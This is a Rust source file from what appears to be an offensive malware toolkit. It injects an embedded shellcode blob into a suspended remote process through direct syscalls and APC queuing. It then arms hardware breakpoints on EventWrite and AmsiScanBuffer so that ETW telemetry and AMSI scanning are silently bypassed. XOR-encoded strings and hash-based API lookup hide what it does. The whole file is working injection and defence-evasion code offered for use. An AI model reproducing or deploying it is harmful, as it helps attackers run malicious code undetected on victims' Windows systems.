// Remote HWBP install + third-APC AMSI rearm.
// Direct port of darkcrypt/src/remote_hwbp.c + darkcrypt-cs/src/RemoteHwbp.cs.
//
// The 240-byte position-independent asm blob is embedded verbatim — same
// bytes extracted for the C# port via objdump + PE section math.

#![allow(dead_code, non_camel_case_types)]

use core::ptr;

use alloc::vec;

use crate::{encoded_strings, hashes, io, native, obfuscation, peb, syscalls};
use native::{HANDLE, PVOID};

pub const BLOB_LEN:      usize = 240;
pub const OFF_VEH_ENTRY: usize = 48;
pub const OFF_ADD_VEH:   usize = 216;
pub const OFF_ETW_SLOT:  usize = 224;
pub const OFF_AMSI_SLOT: usize = 232;

// Bytes extracted from darkcrypt C's debug build (identical bytes already
// embedded in darkcrypt-cs/src/RemoteHwbp.cs).
pub const BLOB: [u8; 240] = [
    0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x30, 0x48, 0xc7, 0xc1, 0x01,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x1a, 0x00, 0x00, 0x00, 0x48, 0x8b,
    0x05, 0xbb, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0xc3,
    0x90, 0x66, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x01, 0x8b, 0x00, 0x3d, 0x04,
    0x00, 0x00, 0x80, 0x75, 0x2d, 0x4c, 0x8b, 0x41, 0x08, 0x4d, 0x8b, 0x88,
    0xf8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x05, 0x8d, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x05, 0x49, 0x39, 0xc1, 0x74, 0x32, 0x48, 0x8b, 0x05,
    0x84, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x05, 0x49, 0x39, 0xc1,
    0x74, 0x08, 0x31, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x49, 0x8b,
    0x80, 0x98, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x50, 0x30, 0x4d, 0x85, 0xd2,
    0x74, 0x07, 0x41, 0xc7, 0x02, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x07, 0x49,
    0x8b, 0x80, 0x98, 0x00, 0x00, 0x00, 0x49, 0xc7, 0x40, 0x78, 0x00, 0x00,
    0x00, 0x00, 0x4c, 0x8b, 0x08, 0x4d, 0x89, 0x88, 0xf8, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xc0, 0x08, 0x49, 0x89, 0x80, 0x98, 0x00, 0x00, 0x00, 0x49,
    0xc7, 0x40, 0x68, 0x00, 0x00, 0x00, 0x00, 0x45, 0x8b, 0x58, 0x44, 0x41,
    0x81, 0xcb, 0x00, 0x00, 0x01, 0x00, 0x45, 0x89, 0x58, 0x44, 0xb8, 0xff,
    0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x0f, 0x1f, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

fn write_u64_at(buf: &mut [u8], off: usize, value: u64) {
    let bytes = value.to_le_bytes();
    buf[off..off + 8].copy_from_slice(&bytes);
}

// ================================================================
// Install — stage blob into remote, arm DR1 on remote (suspended) thread.
// Returns (bootstrap_entry, blob_base).
// ================================================================
pub unsafe fn install(
    h_process: HANDLE,
    h_thread: HANDLE,
) -> Result<(PVOID, PVOID), &'static str> {
    let add_veh = peb::resolve_by_hash(hashes::RTL_ADD_VEH)?;
    let etw_addr = peb::resolve_by_hash(hashes::EVENT_WRITE)?;
    let amsi_addr: usize = 0;

    let mut staged = BLOB.to_vec();
    write_u64_at(&mut staged, OFF_ADD_VEH,   add_veh  as u64);
    write_u64_at(&mut staged, OFF_ETW_SLOT,  etw_addr as u64);
    write_u64_at(&mut staged, OFF_AMSI_SLOT, amsi_addr as u64);

    // Alloc 4 KiB RW in remote.
    let mut base: PVOID = ptr::null_mut();
    let mut size: usize = 0x1000;
    let rc = syscalls::vm_alloc(h_process, &mut base, 0, &mut size,
                                 native::MEM_COMMIT | native::MEM_RESERVE,
                                 native::PAGE_READWRITE);
    if !native::nt_success(rc) || base.is_null() { return Err("rhwbp alloc"); }

    // Write blob.
    let mut written: usize = 0;
    let rc = syscalls::vm_write(h_process, base, staged.as_ptr(), BLOB_LEN, &mut written);
    if !native::nt_success(rc) || written != BLOB_LEN { return Err("rhwbp write"); }

    // Flip to RX.
    let mut prot_size: usize = 0x1000;
    let mut old_prot: u32 = 0;
    let rc = syscalls::vm_protect(h_process, &mut base, &mut prot_size,
                                   native::PAGE_EXECUTE_READ, &mut old_prot);
    if !native::nt_success(rc) { return Err("rhwbp protect"); }

    // Arm DR1 on the suspended remote thread.
    let ctx_words = native::CTX_SIZE / 8;
    let mut ctx = vec![0u64; ctx_words];
    let ctx_ptr = ctx.as_mut_ptr() as *mut u8;
    ptr::write(ctx_ptr.add(native::CTX_CONTEXT_FLAGS) as *mut u32,
               native::CONTEXT_DEBUG_REGISTERS);
    let rc = syscalls::ctx_get(h_thread, ctx_ptr as PVOID);
    if !native::nt_success(rc) { return Err("rhwbp ctx_get"); }

    ptr::write(ctx_ptr.add(native::CTX_DR1) as *mut u64, etw_addr as u64);
    let mut dr7 = ptr::read(ctx_ptr.add(native::CTX_DR7) as *const u64);
    dr7 |= 1u64 << 2;          // L1
    dr7 &= !(0xFu64 << 20);    // type=exec,len=1 at shift 20
    ptr::write(ctx_ptr.add(native::CTX_DR7) as *mut u64, dr7);

    let rc = syscalls::ctx_set(h_thread, ctx_ptr as PVOID);
    if !native::nt_success(rc) { return Err("rhwbp ctx_set"); }

    obfuscation::secure_zero_u8(&mut staged);
    Ok((base, base))  // bootstrap_entry = blob_base + 0 = blob start
}

// ================================================================
// FinishAmsi — third-APC AMSI rearm. Non-fatal on error.
// ================================================================
pub type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> PVOID;

pub unsafe fn finish_amsi(
    h_process: HANDLE, h_thread: HANDLE, blob_base: PVOID,
) -> Result<(), &'static str> {
    if h_process.is_null() || h_thread.is_null() || blob_base.is_null() {
        return Err("null arg");
    }

    // 1. Resolve LoadLibraryA from loader's kernel32.
    let p_load_lib = peb::resolve_by_hash(hashes::LOAD_LIBRARY_A)?;

    // 2. Decode "amsi.dll\0" ASCII.
    let mut amsi_name = obfuscation::xor_dec_mb(
        &encoded_strings::ENC_AMSI_DLL_A,
        &encoded_strings::KEY_AMSI_DLL_A,
    );

    // 3. Alloc 4 KiB RW in remote for the string.
    let mut remote_str: PVOID = ptr::null_mut();
    let mut region: usize = 0x1000;
    let rc = syscalls::vm_alloc(h_process, &mut remote_str, 0, &mut region,
                                 native::MEM_COMMIT | native::MEM_RESERVE,
                                 native::PAGE_READWRITE);
    if !native::nt_success(rc) || remote_str.is_null() {
        obfuscation::secure_zero_u8(&mut amsi_name);
        return Err("amsi-str alloc");
    }

    // 4. Write "amsi.dll\0".
    let mut written: usize = 0;
    let rc = syscalls::vm_write(h_process, remote_str,
                                 amsi_name.as_ptr(), amsi_name.len(), &mut written);
    obfuscation::secure_zero_u8(&mut amsi_name);
    if !native::nt_success(rc) { return Err("amsi-str write"); }

    // 5. SpecialUserAPC LoadLibraryA(remote_str).
    let rc = syscalls::apc_queue_ex(
        h_thread,
        native::QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
        p_load_lib as PVOID, remote_str,
        ptr::null_mut(), ptr::null_mut(),
    );
    if !native::nt_success(rc) {
        let _ = syscalls::apc_queue(h_thread, p_load_lib as PVOID, remote_str,
                                     ptr::null_mut(), ptr::null_mut());
    }

    // 6. Poll remote PEB_LDR for amsi.dll up to ~5s.
    let mut amsi_w = obfuscation::xor_dec_w_mb(
        &encoded_strings::ENC_AMSI_DLL_W,
        &encoded_strings::KEY_AMSI_DLL_W,
    );
    let name_u16: &[u16] = &amsi_w[..amsi_w.len() - 1];  // strip trailing NUL

    let mut remote_amsi: PVOID = ptr::null_mut();
    for _ in 0..50 {
        remote_amsi = remote_find_module(h_process, name_u16);
        if !remote_amsi.is_null() { break; }
        io::sleep(100);
    }
    obfuscation::secure_zero_u16(&mut amsi_w);
    if remote_amsi.is_null() { return Err("amsi.dll not in remote PEB"); }

    // 7. Compute remote AmsiScanBuffer VA via RVA from loader's amsi.
    peb::ensure_amsi()?;
    let loader_scan = peb::resolve_by_hash(hashes::AMSI_SCAN)?;
    let rva = loader_scan.wrapping_sub(peb::amsi_base());
    let remote_scan = (remote_amsi as usize).wrapping_add(rva);

    // 8. Patch blob's amsi_slot (flip RW, write, flip RX).
    let mut slot: PVOID = (blob_base as usize + OFF_AMSI_SLOT) as PVOID;
    let mut flip_size: usize = 8;
    let mut old_prot: u32 = 0;
    let rc = syscalls::vm_protect(h_process, &mut slot, &mut flip_size,
                                   native::PAGE_READWRITE, &mut old_prot);
    if !native::nt_success(rc) { return Err("amsi-slot RW flip"); }

    let scan_bytes = (remote_scan as u64).to_le_bytes();
    let mut wrote: usize = 0;
    let _ = syscalls::vm_write(h_process,
                                (blob_base as usize + OFF_AMSI_SLOT) as PVOID,
                                scan_bytes.as_ptr(), 8, &mut wrote);

    let mut tmp_prot: u32 = 0;
    let mut slot2: PVOID = (blob_base as usize + OFF_AMSI_SLOT) as PVOID;
    let mut flip2: usize = 8;
    let _ = syscalls::vm_protect(h_process, &mut slot2, &mut flip2, old_prot, &mut tmp_prot);

    // 9. Suspend thread, arm DR0 = remote_scan, resume.
    let mut prev: u32 = 0;
    let rc = syscalls::thr_suspend(h_thread, &mut prev);
    if !native::nt_success(rc) { return Err("thr_suspend"); }

    let ctx_words = native::CTX_SIZE / 8;
    let mut ctx = vec![0u64; ctx_words];
    let ctx_ptr = ctx.as_mut_ptr() as *mut u8;
    ptr::write(ctx_ptr.add(native::CTX_CONTEXT_FLAGS) as *mut u32,
               native::CONTEXT_DEBUG_REGISTERS);
    let rc = syscalls::ctx_get(h_thread, ctx_ptr as PVOID);
    if native::nt_success(rc) {
        ptr::write(ctx_ptr.add(native::CTX_DR0) as *mut u64, remote_scan as u64);
        let mut dr7 = ptr::read(ctx_ptr.add(native::CTX_DR7) as *const u64);
        dr7 |= 1u64 << 0;
        dr7 &= !(0xFu64 << 16);
        ptr::write(ctx_ptr.add(native::CTX_DR7) as *mut u64, dr7);
        let _ = syscalls::ctx_set(h_thread, ctx_ptr as PVOID);
    }

    let mut rc_cnt: u32 = 0;
    let _ = syscalls::thr_resume(h_thread, &mut rc_cnt);
    Ok(())
}

// Walk remote PEB_LDR_DATA looking for a module whose BaseDllName matches
// (case-insensitive). Returns DllBase or null.
unsafe fn remote_find_module(h_process: HANDLE, expected: &[u16]) -> PVOID {
    if expected.is_empty() { return ptr::null_mut(); }

    // PROCESS_BASIC_INFORMATION: 48 bytes.
    let mut pbi = [0u8; 48];
    let mut ret_len: u32 = 0;
    let rc = syscalls::proc_info(h_process, 0, pbi.as_mut_ptr() as PVOID,
                                  48, &mut ret_len);
    if !native::nt_success(rc) { return ptr::null_mut(); }
    let peb_addr = u64::from_le_bytes([pbi[8], pbi[9], pbi[10], pbi[11],
                                        pbi[12], pbi[13], pbi[14], pbi[15]]);
    if peb_addr == 0 { return ptr::null_mut(); }

    // PEB.Ldr @ +0x18.
    let ldr = remote_read_ptr(h_process, peb_addr + 0x18);
    if ldr == 0 { return ptr::null_mut(); }

    // InLoadOrderModuleList @ ldr + 0x10 (first Flink).
    let list_head = ldr + 0x10;
    let mut cur = remote_read_ptr(h_process, list_head);
    if cur == 0 { return ptr::null_mut(); }

    for _ in 0..512 {
        if cur == 0 || cur == list_head { break; }

        let dll_base = remote_read_ptr(h_process, cur + 0x30);

        // UNICODE_STRING BaseDllName @ cur+0x58: {u16 Length, u16 MaxLen, u32 pad, u64 Buffer}
        let mut us = [0u8; 16];
        let mut r: usize = 0;
        let rc = syscalls::vm_read(h_process, (cur + 0x58) as PVOID,
                                    us.as_mut_ptr(), 16, &mut r);
        if native::nt_success(rc) && r == 16 {
            let name_len = u16::from_le_bytes([us[0], us[1]]) as usize;
            let buffer = u64::from_le_bytes([us[8], us[9], us[10], us[11],
                                              us[12], us[13], us[14], us[15]]);
            if name_len >= expected.len() * 2 && buffer != 0 {
                let mut name_bytes = vec![0u8; name_len];
                let mut nr: usize = 0;
                let rc = syscalls::vm_read(h_process, buffer as PVOID,
                                            name_bytes.as_mut_ptr(),
                                            name_len, &mut nr);
                if native::nt_success(rc) && nr == name_len {
                    if name_match_ci(&name_bytes, expected) {
                        return dll_base as PVOID;
                    }
                }
            }
        }

        let next = remote_read_ptr(h_process, cur);  // Flink @ +0
        if next == cur { break; }
        cur = next;
    }
    ptr::null_mut()
}

unsafe fn remote_read_ptr(h_process: HANDLE, addr: u64) -> u64 {
    let mut buf = [0u8; 8];
    let mut r: usize = 0;
    let rc = syscalls::vm_read(h_process, addr as PVOID, buf.as_mut_ptr(), 8, &mut r);
    if !native::nt_success(rc) || r != 8 { return 0; }
    u64::from_le_bytes(buf)
}

fn name_match_ci(wide: &[u8], expected: &[u16]) -> bool {
    let wide_chars = wide.len() / 2;
    if wide_chars != expected.len() { return false; }
    for i in 0..expected.len() {
        let w = ((wide[i * 2] as u16) | ((wide[i * 2 + 1] as u16) << 8)) as u32;
        let e = expected[i] as u32;
        let wl = if w >= b'A' as u32 && w <= b'Z' as u32 { w + 32 } else { w };
        let el = if e >= b'A' as u32 && e <= b'Z' as u32 { e + 32 } else { e };
        if wl != el { return false; }
    }
    true
}
